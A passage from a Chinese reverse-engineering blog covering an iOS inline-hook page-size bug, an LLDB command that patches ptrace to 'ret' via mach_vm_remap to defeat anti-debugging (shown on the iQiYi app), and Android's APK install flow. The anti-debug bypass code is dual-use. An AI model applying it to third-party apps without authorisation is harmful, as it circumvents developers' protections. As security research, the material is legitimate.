从上面可以发现前四条指令正是原函数new_ZTL7624417887的前四条指令等价指令，然后再进行跳转 0x104a53ff8: 0x58000050 ldr x16, #0x8 0x104a53ffc: 0xd61f0200 br x16 0x104a54000: 0x00f52078 .long 0x00f52078 ; unknown opcode 0x104a54004: 0x00000001 .long 0x00000001 ; unknown opcode (lldb) x/g 0x104a54000 0x104a54000: 0x0000000100f52078 这里跳转的地址就是原函数new_ZTL7624417887的第五条指令地址，这样整个调用原函数的过程就结束了。 vm_remap内存bug原因以及解决办法这个bug困扰了我3周，内心相当难受，每天一有时间就会来尝试解决这个问题。frida、substitute、substrate都能够在iOS11/12上面进行代码段patch。为什么我写的代码就会有问题。 正如前面的那样，我尝试去分析substitute和substrate进行patch相关的细节，无论从闭源的substrate逆向分析，还是开源的substitute源码分析。最开始以为是代码签名问题，但在这两个框架中都没发现和代码签名相关的代码，于是转向frida，果然发现了很多和运行时内存页签名的代码。于是我以为我找到原因了，很可能就是代码签名的问题了，在这期间阅读了frida很多相关代码，也把iOS上的代码签名机制重新学习了一遍。就这样一直进入了代码前面的坑里面，甚至想去研究下remap对应的内核代码，到底是什么原因。 由于还是感觉还是没有找到问题的关键，于是我再从新回头过来思考iOS inlinehook本身，再次goolge搜索关键字，如果这是一个通用的问题那么理论上应该能搜到相关的资料。原本是想搜iOS inlinehook在各系统版本上面的差异变化。不巧搜到了一个别人抽离substitute的hook代码，由于直接抽离了出来，所以在Xcode中十分方便调试。于是抱着试一试的心态重新分析substitute的代码，结果我发现居然这个hook代码能够在iOS12上面进行代码patch。这就很有意思了，这说明CoolStar并不是进行了其他hack操作才能进行hook。就是原本substitute就能正常patch。这样就消除了我之前认为是越狱开发者从内核层面给hook框架提供的支持。接下来我决定一步步的跟下去，看代码patch那里到底和我写的代码差异在哪里。后面发现我的内存页大小居然和substitute里面的页大小不一致。我定义了页大小为4K也就是0x1000，而substitute为16K即0x4000。其实内存页大小这部分代码我也是参考别人写的代码，那代码是2019年作者能够正常运行，应该没问题的。因为目前iOS的设备32位基本淘汰了，然而那个代码定义的页大小就是32位设备上的4K，我手里的设备都是64位的，如果按照32位的4K去分配以及其他操作肯定会出问题。这和我之前remap后的内存错误也对应上来了，之前全部覆盖为0数据的大小正式4K的4倍，也就是一个64位上的16K内存页大小。最后我把内存页大小改为16K以后再次运行发现这次没有崩溃了，再检查一下patch的地址是否修改以及运行是否符合预期，发现一切都正常工作。 找到原因以后，我把xia0LLDB中的debugme的内存页大小改为16K以后再测试，发现在iOS12上就能够正常的反反调试了。到这里，困扰了我这么久的问题终于得到了解决，也给我以后分析bug有一定启示，很多时候我们先要对整个运行过程以及基本原理要足够了解，这里就因为我理所当然的认为那个代码在内存页大小这个问题上不会有问题，所以也没有仔细去查看是否正确，从而导走偏了方向。 iOS unc0vers inlinehook失败原因分析(2019/09/19)日志： sub_1D124() call sub_13B2C() call __int64 MSServerPort() { char *v0; // x0 int v1; // w20 v0 = **_NSGetArgv(); if ( v0 &amp;&amp; !strcmp(v0, &quot;/usr/libexec/substrated&quot;) ) return 0LL; if ( !dword_12D524 || (v1 = dword_12D528, v1 != getpid()) ) { dword_12D524 = sub_1425C(); dword_12D528 = getpid(); } return (unsigned int)dword_12D524; } v3 = bootstrap_look_up(special_port, &quot;cy:com.saurik.substrated&quot;, &amp;sp); mobilesubstrate deb包的目录结构 xia0 ~/xia0/iOSRE/research/iOS11-12-CodePatch-vm_remap-bug/Undecimus.app/apt $ dpkg -X mobilesubstrate_0.9.7033_iphoneos-arm.deb ./extract ./ ./Library/ ./Library/Frameworks/ ./Library/Frameworks/CydiaSubstrate.framework/ ./Library/Frameworks/CydiaSubstrate.framework/Headers/ ./Library/Frameworks/CydiaSubstrate.framework/Info.plist ./Library/MobileSubstrate/ ./Library/MobileSubstrate/DynamicLibraries/ ./usr/ ./usr/bin/ ./usr/bin/cycc ./usr/bin/cynject ./usr/include/ ./usr/include/substrate.h ./usr/lib/ ./usr/lib/cycript0.9/ ./usr/lib/cycript0.9/com/ ./usr/lib/cycript0.9/com/saurik/ ./usr/lib/cycript0.9/com/saurik/substrate/ ./usr/lib/cycript0.9/com/saurik/substrate/MS.cy ./usr/lib/libsubstrate.dylib ./usr/lib/substrate/ ./usr/lib/substrate/SubstrateBootstrap.dylib ./usr/lib/substrate/SubstrateInserter.dylib ./usr/lib/substrate/SubstrateLoader.dylib ./usr/libexec/ ./usr/libexec/substrate ./usr/libexec/substrated ./Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate ./Library/Frameworks/CydiaSubstrate.framework/Headers/CydiaSubstrate.h ./Library/MobileSubstrate/MobileSubstrate.dylib 参考 https://github.com/coolstar/electra/issues/233 https://github.com/coolstar/electra/blob/master/docs/getting-started.md#platformizing-a-binary https://github.com/ipasimulator/lldb https://github.com/BishopFox/bfinject https://coolstarorg.tumblr.com/ http://www.newosxbook.com/articles/CodeSigning.pdf https://github.com/frida/frida-gum/commit/30deb2c29f060948407b585c4b23475ea60b965b https://github.com/Siguza/ios-resources/blob/master/bits/arm64.md https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c https://github.com/anahadaw/iOS_Hook https://forums.developer.apple.com/thread/47532","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"hook","slug":"hook","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/hook/"}]},{"title":"iOS LLDB中反反调试分析与实现","date":"2019-08-12T11:16:01.000Z","path":"2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/","text":"iOS LLDB中反反调试分析与实现开始关于反调试和反反调试，已经有很多人分析过了，也有很多解决方案。但是在LLDB中做反反调试还没人做过，这也是我一直想解决的一个方案，毕竟本身就是为了调试，那么在LLDB直接输入一行命令就能反反调试应该相对酸爽。本文将介绍一种基于内存单指令patch的方式进行反反调试的方案，大概意思就是通过直接修改代码段的指令来绕过反调试机制。 目前反调试与反反调试情况这里庆哥写了一遍文章分析了 关于反调试&amp;反反调试那些事 这里简单归纳一下，有如下几种： ptrace sysctl syscall SIGTOP task_get_exception_ports 这里实际上就大概三种，其他都是基于ptrace的变种。ptrace这个函数是linux就提供的一个接口，常常用作linux系的反调试，本质就是通过26号系统调用来完成的，目前大多反调试都利用该方案。 后面看到庆哥同样提供了一个反反调试的LLDB脚本，不过看了下和我的思路还是不一样的。（差点以为白做了） 正如文章里面写到通过lldb下断点，然后修改参数，或者直接返回也可以达到反反调试的效果。由于要不断去检查执行状态等，或者程序有定时器定时检测，这个脚本影响性能及变得很卡影响调试体验。不过还是膜庆哥的方案，学习了。 内存patch实现反反调试说一下大概思路： 内存中找到ptrace地址 将该内存map为rwx 直接将首调指令修改为ret指令 刚开始以为就这样简单就完了，结果实际写代码的时候才发现过程远比想象中复杂。 由于iOS不允许直接将代码段map为写权限，这里调用mach_vm_protect或mprotect都会异常。但是类似frida、substitute以及hookzz都能进行指令hook。这样说来，肯定是可以修改代码段的。看了下substitute以及frida中关于这块的实现，才发现可以用一种remap的方式修改代码段。 大致的流程如下： 使用mmap新建一块内存，把这块内存叫做new 使用vm_copy把想要篡改的处于__text段内的内存（把这块内存叫target）拷贝到new里 向new里写入想执行的代码 调用mprotect把new改为rx。因为mmap出来的内存的max_protection是rwx，所以这里mprotect改权限没问题 调用mach_vm_remap把new的内容反映回target里 不过当我写代码测试的时候发现，remap以后整个页数据都变成了0。实在不清楚原因，向Zz求助，Zz直接扔了我他实现这块的代码。我看了以后收益匪浅，只怪之前没分析hookzz的具体实现。后面才知道由于我的设备是iOS12，Zz意思是codesign的问题，hookZz也没支持。于是换了一台iOS9的设备，果然就可以了，向Zz低头。 期间还由于我手残忘记调用mprotect把new改为rx。导致直接执行异常，用memory region查看地址才知道页保护属性为rw。 相关代码如下： 1、map new page for patch // map new page for patch void *new = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0); if (!new ){ NSLog(@&quot;[-] mmap failed!&quot;); return; } NSLog(@&quot;[*] new map address:%p&quot;, new); 2、start patch // start patch kret = vm_copy(self_task, (unsigned long)page_start, PAGE_SIZE, (vm_address_t) new); if (kret != KERN_SUCCESS){ NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno); return; } char patch_ret_ins_data[4] = {0xc0, 0x03, 0x5f, 0xd6}; // ret memcpy((void *)(new+patch_offset), patch_ret_ins_data, 4); NSLog(@&quot;[*] new map+offset address:%p&quot;, (void *)(new+patch_offset)); 3、set new page back to r-x // set back to r-x int ret = mprotect(new, PAGE_SIZE, PROT_READ | PROT_EXEC); NSLog(@&quot;[*] ret: %d, errno: %d, addr: %p&quot;, ret, errno, new); 4、remap the target page kret = mach_vm_remap(mach_task_self(), &amp;target, PAGE_SIZE, 0, VM_FLAGS_OVERWRITE, self_task, (mach_vm_address_t) new, TRUE, &amp;c, &amp;m, inherit); if(kret != KERN_SUCCESS){ NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno); return; } NSLog(@&quot;[*] now ptrace_ptr address:%p&quot;, ptrace_ptr) 5、clear cache void* clear_start_ = (void*)page_start + patch_offset; sys_icache_invalidate (clear_start_, 4); sys_dcache_flush (clear_start_, 4); 完整的代码在xia0LLDB里面已经集成：https://github.com/4ch12dy/xia0LLDB 一个简单反反调试实验这里以爱奇艺为例子分析，爱奇艺在main函数里面动态调用了ptrace函数进行反调试。 后台启动方式启动爱奇艺 xia0 ~ $ issh debug -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo [I]:iproxy process for 2222 port alive, pid=16264 [I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++ [I]:iOSRE dir exist [I]:iproxy process for 1234 port alive, pid=16428 [I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null) [I]:/iOSRE/tools/debugserver file exist, Start debug... [I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo LLDB挂上以后在main函数下断点以后直接执行debugme命令 (lldb) debugme Kill antiDebug by xia0: [*] ptrace target address: 0x1837dc180 and offset: 0x180 [*] mmap new page: 0x1021ec000 success. [+] vm_copy target to new page. [+] patch ret[0xc0 0x03 0x5f 0xd6] with memcpy [*] set new page back to r-x success! [*] get page info done. [+] remap to target success! [*] clear cache success! [+] all done! happy debug~ 下面查看对比下patch前后指令ptrace首指令的变化 Patch之前 (lldb) x/12i 0x00000001837dc180 0x1837dc180: 0xf00f26a9 adrp x9, 124119 0x1837dc184: 0x91034129 add x9, x9, #0xd0 ; =0xd0 0x1837dc188: 0xb900013f str wzr, [x9] 0x1837dc18c: 0xd2800350 mov x16, #0x1a 0x1837dc190: 0xd4001001 svc #0x80 0x1837dc194: 0x540000c3 b.lo 0x1837dc1ac ; &lt;+44&gt; 0x1837dc198: 0xa9bf7bfd stp x29, x30, [sp, #-0x10]! 0x1837dc19c: 0x910003fd mov x29, sp 0x1837dc1a0: 0x97ff9b08 bl 0x1837c2dc0 ; cerror 0x1837dc1a4: 0x910003bf mov sp, x29 0x1837dc1a8: 0xa8c17bfd ldp x29, x30, [sp], #0x10 0x1837dc1ac: 0xd65f03c0 ret Patch之后 (lldb) x/12i 0x1837dc180 0x1837dc180: 0xd65f03c0 ret 0x1837dc184: 0x91034129 add x9, x9, #0xd0 ; =0xd0 0x1837dc188: 0xb900013f str wzr, [x9] 0x1837dc18c: 0xd2800350 mov x16, #0x1a 0x1837dc190: 0xd4001001 svc #0x80 0x1837dc194: 0x540000c3 b.lo 0x1837dc1ac ; &lt;+44&gt; 0x1837dc198: 0xa9bf7bfd stp x29, x30, [sp, #-0x10]! 0x1837dc19c: 0x910003fd mov x29, sp 0x1837dc1a0: 0x97ff9b08 bl 0x1837c2dc0 ; cerror 0x1837dc1a4: 0x910003bf mov sp, x29 0x1837dc1a8: 0xa8c17bfd ldp x29, x30, [sp], #0x10 0x1837dc1ac: 0xd65f03c0 ret 可以发现首地址已经变成了ret指令。 执行continue命令，发现爱奇艺已经能够正常调试。 (lldb) c Process 3176 resuming 2019-08-13 17:22:17.283 iQiYiPhoneVideo[3176:161840] [plcrash]: init ok 2019-08-13 17:22:17.790 iQiYiPhoneVideo[3176:161840] -[QYBaikePageDurationManager bk_appDidBecomeActive:] 2019-08-13 17:22:17.922 iQiYiPhoneVideo[3176:161840] CoreData: Failed to load optimized model at path &#39;/var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/QYPGCDataModel.momd/QYPGCDataModel_970.omo&#39; 2019-08-13 17:22:20.477 iQiYiPhoneVideo[3176:161840] OSStatus error: [-34018] Security error has occurred. 2019-08-13 17:22:20.558 iQiYiPhoneVideo[3176:162000] OSStatus error: [-34018] Security error has occurred. 3176:161840] Incorrect NSStringEncoding value 0x8000100 detected. Assuming NSASCIIStringEncoding. Will stop this compatiblity mapping behavior in the near future. ontainers/Data/Application/5C31FE18-9BA4-4B2D-80C6-68BF7F65855F/Library/Application Support/爱奇艺/0_im.sqlite 总结/Todo这里只是简单的绕过了ptrace方式的反调试，针对直接用汇编写的反调试我的做法是静态内存搜索匹配svc位置，发现是调用26号系统调用则利用内存patch为nop。或者写一个简单的hook代码，hook所有的svc地址，判断寄存器的值然后进行hook即可，这样就能绕过这些反调试机制，再次向Zz和庆哥低头。 参考/致谢 https://gist.github.com/piaoger/4ba83f6a954bca113505 https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c https://www.codercto.com/a/63507.html https://github.com/jmpews/HookZz/blob/dev/srcxx/UserMode/ExecMemory/code-patch-tool-darwin.cc#L26 https://github.com/gdbinit/readmem/blob/master/readmem/main.c https://github.com/frida/frida-gum/blob/master/gum/backend-darwin/machexc.h http://newosxbook.com/src.jl?tree=xnu&amp;file=/libsyscall/mach/mach_vm.c https://github.com/DaKnOb/memscan/blob/master/main.mm http://iosre.com/t/topic/8179","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"LLDB","slug":"LLDB","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"}]},{"title":"Android应用安装过程深度解析","date":"2019-08-01T07:08:31.000Z","path":"2019/08/01/android-apk-install-process/android-apk-install-process/","text":"Android应用安装过程深度解析 本文由我和willing对整个安装过程的原理梳理，感谢willing精心的绘图以及相关源码整理。 开始关于对Android应用的安装过程梳理，是因为很多重打包的外挂利用系统矫正器来绕过安卓系统的签名校验。为了分析其原理，详细分析了Android应用安装的过程，找到其中签名校验的地方，进一步做一些对抗和检测。 整体流程一个 Android 应用安装到手机上大致分为四种情形： 系统应用，在设备每次启动时完成安装 通过 adb install 命令安装 应用市场安装，封装安装过程（略） 第三方应用安装或双击安装包，会启动系统应用引导安装 无论采用哪种安装方式，最终的安装过程都会走到 PackageManagerService，由这个类来完成一系列的工作。PackageManagerService 实际上是一个系统服务，负责提供系统上所有应用的管理，包括安装、优化、查询和卸载，这个类最终会通过 socket 与 installd 这个守护进程通信，真实对应用进行操作的其实是由 installd 这个进程完成。 场景一：系统应用安装在设备启动时，Linux 系统的用户空间进程 init （pid = 1）会孵化许多子进程，包括一系列守护进程，其中就有上面提到的 installd，然后会孵化许多重要的系统服务，如 servicemanager，这个进程会负责管理所有服务的 Binder 通信，最后 init 还会孵化 zygote 进程，这个进程是第一个 Java 进程，zygote 进程会孵化出许多应用程序进程，包括 launcher 进程，即桌面进程，zygote 还会孵化出 system_server 进程，负责启动和管理 Framework 的 Java 层服务，包括 PackageManagerService、ActivityManagerService 等。 补充：system_server 的启动与运行流程 system_server 由 zygote 进程孵化，是整个 Android Framework 的基础 zygote 启动阶段会调用 forkSystemServer() 创建子进程 system_server ForkAndSpecializeCommon 函数中完成进程创建工作并返回，两次返回，pid=0 时为子进程，pid&gt;0 时为父进程。onZygoteInit() 回调的实现在在 app_main.cpp 中，会调用 ProcessState::self() 初始化 binder 的交互操作，然后调用 proc-&gt;startThreadPool() 创建 binder 线程进行通信 RuntimeInit 的 findStaticMain() 调用 com.android.server.SystemServer 的 main 方法 SystemServer 的 run() 方法中会完成以下工作： 设置时间、语言等，设置虚拟机库文件，设置内存 Looper.prepareMainLooper() 主线程 looper 运行在当前线程 加载库文件 android_servers，位于 /frameworks/base/services createSystemContext() 初始化系统上下文 SystemServiceManager() 创建系统服务管理器，并添加到本地服务成员 LocalServices 中 启动各种系统服务，包括引导服务、核心服务、其他服务 开启循环，等待其他线程通过 handler 发送消息到主线程来处理 在 system_server 进程启动过程中会启动各种系统服务，其中就包含 PackageManagerService PackageManagerService 类构造函数中完成了许多工作，主要包含： 创建 Settings 对象，添加系统的 SharedUser 信息 为 Installer 对象赋值，赋值参数是在 system_server 进程中创建的 创建 PackageDexOptimizer 和 DexManager 对象 获取 SystemConfig 实例，获取系统的全局配置信息，如 GlobalGids、SystemPermissions、AvailableFeatures 创建 ServiceThread 和 PackagerHandler 对象 创建 UserManagerService，支持多用户 读取系统定义的权限保存到 permConfig 变量中 读取系统共享库保存到 libConfig 变量中 解析 package.xml 文件中的内容保存到 ArrayMap 结构中 配置扫描参数 scanFlags 开始扫描系统应用，包括目录 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app 开始扫描非系统应用，包括目录 /data/app、/data/app-private 启动内存垃圾回收 启动私有服务 PackageManagerInternal 总结来说主要是这几项内容： 创建了 Java 层 Installer 和 C 层 installd 之间的 socket 连接 扫描各目录下 apk文件完成安装（建立各安装包的配置结构信息，并添加到全局列表中进行管理） 创建了 PackageHandler 对象并建立消息循环，接收外部的安装请求 解析权限，建立底层 Linux Kernel 的用户机制和虚拟机层权限机制之间的映射 详细说明各项： Installer 是 PackageManagerService 的一个内部类，继承自SystemService，协助完成安装过程，主要是进行 apk 格式转换和数据目录建立，封装对文件和路径操作，真正的安装工作交由 IInstalld 内部类对象完成。 Installer 在 SystemServer 中启动，通过 SystemServiceManager 的 startService(Installer.class) 启动。 构造函数 Installer() 初始化 context 和 isolated（是否真正连接installd）成员变量 重写 onStart() 方法，基于 isolated 判断是否调用 connect() 进行连接 connect() 通过 ServiceManager 获取 installd 服务并拿到服务的本地代理放到成员变量 mInstalld 中 Installer 调用 dexopt() 最终调用了 mInstalld 的dexopt() 方法，其他方法类似，几乎就是一个 IInstalld 类的封装 !!!! Installer 的实现变化很大：6.0 上通过以命令的方式通过 execute 方法执行；8.1 通过 AIDL 接口实现 PackageManageService（system权限） 与 installd（root权限） 守护进程共同完成应用管理 PackageManagerService 的构造函数中会扫描许多应用目录来安装 apk 包括： 系统应用，目录有 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app 非系统应用，目录有 /data/app、/data/app-private 调用的方法是 scanDirTracedLI() 可以看到依次调用 scanDirLI()、scanPackageLI()、scanPackageInternalLI() 其中，scanDirLI() 调用了 ParallelPackageParser 类进行解析，从名字也能看出做了一些并行的优化处理，真正的工作还是交给 PackageParser 来完成，PackageParser 的 parsePackage() 方法内部完成了应用的解析，实际上是解析了 AndroidManifest.xml 文件里面各个标签，包括包名、版本、权限、各组件这些信息，最后的解析结果放在 PackageParser.Package 类中返回给 PMS，这样 PMS 就拥有应用的信息便与做各种管理 后面继续调用了 scanPackageLI() 和 scanPackageInternalLI() 是进一步检测应用是否需要更新，如果需要更新则接着调用 createInstallArgsForExisting() 构造安装参数开始安装（后面还会遇到这个函数，暂时不展开），安装涉及到的签名校验也是在这里，调用了 collectCertificatesLI()、compareSignatures() 等 场景二：adb 命令安装adb 是 Android SDK 提供的一个命令行工具，为客户端-服务器架构，服务端为移动端上运行的守护进程 adbd，与 installd 一样由 init 进程创建 源码路径为：http://androidxref.com/8.1.0_r33/xref/system/core/adb/ adb_commandline() 函数接收 adb 命令行参数，调用 install_app() 执行安装流程，这个函数会对命令行做一些修改，实际上调用 pm 命令，并通过 send_shell_command() 将命令发送给 Pm 类。 Pm 启动函数 main 会构造 Pm 类对象并调用 run() 方法，在这个方法里首先会获取 PackageManger 服务 mPm，然后调用 getPackageInstaller() 获取 PackageInstaller 对象 mInstaller，最后基于不同的命令调用不同的方法。 runInstall() 里面会首先获取之前解析时设置的安装参数 InstallParams，然后依次调用 doCreateSession() 创建安装会话，doWriteSession() 会通过 IO 流将应用信息写入 PackageInstaller.Session 对象，doCommitSession() 会提交相应的会话启动安装，最后调用 abandonSession() 结束会话。 PackageInstallerSession 的 commit() 方法首先将包信息封装到 PackageInstallObserverAdapter 这个类中，是 PackageInstallerService 的一个内部类，然后通过这个适配器获取 PackageInstallObserver2 对象代理，这是一个跨进程的观察者，接收安装状态的回调，最后用 Handler 的 obtainMessage 构造一个 MSG_COMMIT 类型的消息并发送出去。 发送的消息由 PackageInstallerService 的 Handler.Callback 接受，然后调用 commitLocked()，此方法最终会调用 PMS 的 installStage() 方法。 PackageInstallObserver2 对象接收到安装成功的回调时，会接着调用 PackageInstallerService 的 dispatchSessionFinished()，这个方法最后也是到了 PMS 里面调用 sendSessionCommitBroadcast() 方法。 场景三：第三方应用安装当下载一个新的应用包双击安装时，实际上是发送了一个 “android.intent.action.INSTALL_PACKAGE” 的 intent，这个时候会唤起 Android 系统的一个应用 PackageInstaller 来完成安装操作 PackageInstaller 的应用代码位于：http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/ 安装位置 /system/priv-app/GooglePackageInstaller，是一个 Android 系统默认应用程序，提供了用户界面来管理应用或包，用于安装普通文件 应用双击安装后会唤起 PackageInstaller 应用，入口类为 InstallStart，onCreate() 首先被调用完成一些初始化过程，然后获取调用源做一些权限检查。 然后会调起 PackageInstallerActivity，onCreate() 会包括获取 PackageManager 和 PackageInstaller 对象，然后从 intent 中获取 mSessionId、packageUri、mOriginatingURI、mReferrerURI 这些与安装包相关的信息，接着调用 processPackageUri() 解析 uri，这里面会调用 PackageParser 去解析包，再接着会调用 bindUi() 完成安装主界面的展示和部件绑定，最后调用 checkIfAllowedAndInitiateInstall() 检查是否允许安装，如果允许，里面会继续调用 initiateInstall() 初始化安装，实际上这个函数是检查是否需要替换安装，最后调用 startInstallConfirm() 准备安装，设置 mOk 这个安装按钮为 true。 用户确认点击安装按钮后，调用 startInstall() 开始安装，这个函数里面又会构造一个 intent 传递必要的数据，开启 InstallInstalling 这个 activity。 InstallInstalling 这个类会拿到应用数据开启真正的安装流程。 首先是 onCreate() 函数，首先从 Intent 中取出数据放到 ApplicationInfo 中，然后基于拿到的应用信息分两种情况：如果是更新，则调用 getPackageManager() 获取 PackageManager 然后调用 installExistingPackage() 安装，成功调用 launchSuccess() 方法，失败调用 launchFailure() 方法，launchSuccess 会构造 Intent 跳转到 InstallSuccess 类， launchFailure 则跳转到 InstallFailed 类；如果是新应用的安装，首先会向 InstallEventReceiver 注册一个安装结果监听的广播，成功调用 launchSuccess，失败调用 launchFailure。 接下来是 onStart() 方法，这里会依次调用 getPackageManager()，getPackageInstaller()，registerSessionCallback() 注册会话的回调。 最后是 onResume() 方法，这个方法里会获取 session 的相关信息，然后创建并执行 InstallingAsyncTask() 的安装服务，其中的 doInBackground() 方法会将应用信息通过 IO 流写入 PackageInstaller.Session 中，onPostExecute() 方法则构造一个 PendingIntent 并将它的 IntentSender 通过 PackageInstaller.Session 的 commit() 方法发送出去 这里就跟 adb 安装走到了同一个流程中。 深入 PMS 中的安装上面的后面两种场景最后都会通过 PackageInstallerSession 的 commit() 方法提交一个安装的会话，并且最终调用到了 PackageManagerService 的 installStage() 方法 在 installStage() 里会基于传入的参数构造一个 InstallParams 对象，这个对象中包含安装包的所有数据，然后将这个对象作为消息内容，通过 mHandler 发送一个类型为 INIT_COPY 的消息。 所有类型的消息处理都在 PackageHandler 里，这个类会通过 Binder 与 system_server 创建的 ServiceThread 线程绑定，PackageHandler 负责分发任务，ServiceThread 负责处理任务。 1、处理 INIT_COPY 消息 首先从消息结构中取出前面封装好的 HandlerParams 对象，然后检查 mBound 标志判断是否绑定 DefaultContainerService，这个服务用于检查和复制文件，位于 com.android.defcontainer 进程，通过 IMediaContainerService 与PMS 通信，mBound 默认为 false，此时调用 connectToService() 来绑定服务，并获取当前索引值的 HandlerParams 对象添加到 mPendingInstalls 这个 HandlerParams 的 ArrayList 中，如果 mBound 为 true，即服务已经连接，则直接添加 HandlerParams 对象，并发送一个 MCS_BOUND 消息。 2、处理 MCS_BOUND 消息 首先检查 DefaultContainerService 服务连接没问题，就开始处理安装请求队列，从 mPendingInstalls 中取出 HandlerParams 对象并调用它的 startCopy() 方法。 HandlerParams 是 PMS 中的抽象类，它的 startCopy() 会通过一个 mRetries 的私有变量检查尝试次数，超过4次则向 Handler 发送 MCS_GIVE_UP 的消息，抓到异常则发送 MCS_RECONNECT 的消息，成功则继续调用 handleStartCopy() 这个抽象方法，具体实现在 InstallParams 中， InstallParams 的 handleStartCopy() 会首先是确定应用安装位置，是sd卡还是内部存储，并且做一些检查如位置冲突，空间够不够，然后通过 createInstallArgs() 创建 InstallArgs 类，然后调用这个类的 copyApk() 方法，InstallArgs 类也是抽象类，定义了应用包安装逻辑，子类包括 FileInstallArgs，处理 non-ASEC 应用，也即内部存储空间的应用， AsecInstallArgs 处理安装到 SD 卡中的应用，以及 MoveInstallArgs 处理已安装的应用，因此实际上是调用各自实例对象的 copyApk() 方法 以 FileInstallArgs 为例，copyApk() 方法会调用 doCopyApk()，在这个方法里会首先创建一个临时存储目录，然后调用 DefaultContainerService 的 copyPackage() 方法完成 apk 复制 HandlerParams 复制 apk 后会调用 handleReturnCode()，这个方法又会调用 processPendingInstall() 方法，最终会调用到 InstallArgs 的 doPreInstall() 完成安装前的清理工作，调用 installPackageTracedLI() 实现真正的安装，以及调用 InstallArgs 的 doPostInstall() 完成收尾的清理工作，最后发送一个类型为 POST_INSTALL 的消息 installPackageTracedLI() 里面完成的是真正的安装操作，会依次进行变量初始化，再次解析应用包，获取签名信息，权限检查，安装路径重命名等等操作，最后根据参数有两种不同的处理方式，更新条件下的覆盖安装，调用 replacePackageLI() 方法，以及应用的首次安装，调用 installNewPackageLI() 方法 其中 replacePackageLI() 会首先清楚应用包的注册信息，然后类似 installNewPackageLI() 里面的流程重新安装更新的包，直接看 installNewPackageLI() 流程 installNewPackageLI() 里面调用 scanPackageTraceLI() 执行安装，然后这个函数里面又会继续调用 scanPackageInternalLI() 执行包解析，最后将 PackageParser.Package 对象返回出来，扫描完包之后就会调用 updateSettingsLI() 更新 Settings，也就是更新应用在 PMS 中的注册信息，会修改包括 packages.xml、package.list 等相关文件，如果安装成功则调用 prepareAppDataAfterInstallLIF() 来创建相关的数据目录，失败则执行回退操作 deletePackageLIF() 3、处理 POST_INSTALL 消息 首先从 mRunningInstalls 中拿到 PostInstallData 对象，mRunningInstalls 是 PostInstallData 格式的列表，在应用安装成功时构建，在安装完成后会调用 delete() 移除这一条记录，接下来取 PostInstallData 对象中的一些信息如安装参数，授予的权限等作为参数调用 handlePackagePostInstall() 执行安装完成的后续操作，包括授予权限，发送安装成功广播，发送启动广播等等 安装过程小结与应用相关的一些目录 /system/priv-app：系统应用安装路径，Android 4.4+ 开始出现，区分系统应用权限，拥有 SignatureOrSystem 权限，此目录下的 service 具有保活能力 /system/app：系统应用安装路径，权限略低于 priv-app 目录下的应用，放置比如厂商内置应用 /data/app：用户应用安装路径，应用安装时将 apk 复制到此目录下 /data/data：用户应用数据存放路径，存在沙箱隔离 /data/dalvik-cache：存放应用的dex 文件 /data/system：存放应用安装相关文件 packages.xml 是一个应用的注册表，在解析应用时创建，有变化时更新，记录系统权限，各应用信息，如name, codePath, flag, version, userid，下次开机时直接读取并添加到内存列表 package.list 指定应用的默认存储位置，userid 等 应用安装过程总结 将应用 apk 拷贝到指定目录下 解压 apk，将 dex 文件拷贝到 /data/dalvik-cache 目录，创建 /data/data/ 数据目录 解析 AndroidManifest.xml 及其他资源文件，提取应用包信息，注册到 packags.xml 中 由 Launcher 进程通过 PMS 取出所有应用程序，展示在桌面上 PMS 与 PM 与APM前面的一切分析都是围绕 PackageManagerService 来进行的，但是实际上平时开发过程中基本接触不到这个类，在用户层用得最多的应该是 PackageManager 这个类 通常在用户层通过 Context 的 getPackageManager() 方法来获取 PackageManager 实例，Context 的 getPackageManager() 实现在 ContextImpl 里面，这个函数实际上返回的是一个 ApplicationPackageManager 对象，ApplicationPackageManager 类构造函数需要两个璨是，一个是 ContextImpl 自身，另一个是通过 ActivityThread 的 getPackageManager() 获取 IPackageManager 对象 ActivityThread 的 getPackageManager() 首先调用 ServiceManager 的 getService(“package”) 获取 IBinder 对象，然后通过 IPackageManger.Stub.asInterface(IBinder) 获取 IPackageManager 对象，实际上为这个对象的一个代理 继续梳理一下这个类与 PMS 之间的关系 IPackageManager 使用了 Android 接口定义语言（AIDL）实现进程间通信，通过在 .aidl 后缀的文件中定义好接口，Android SDK 就会基于此文件自动生成一个 IBinder 接口的类，服务端实现这些接口，客户端则通过绑定到服务调用接口中定义的方法 IPackageManager 通过 AIDL 文件自动生成的一个接口类，继承自 IInterface IPackageManager.Stub 是 IPackageManager 的内部类，继承自 Binder，实现 IPackageManager asInterface() 方法接受 IBinder 对象，转换成 IPackageManager 类型对象并返回，实际上返回的是 IPackageManager.Stub.Proxy 对象 asBinder() 方法返回自身，即 IPackageManager.Stub 对象 重写了 onTransact() 方法，根据命令类型处理数据传输 IPackageManager.Stub.Proxy 是 IPackageManager.Stub 的内部类，实现了IPackageManager接口 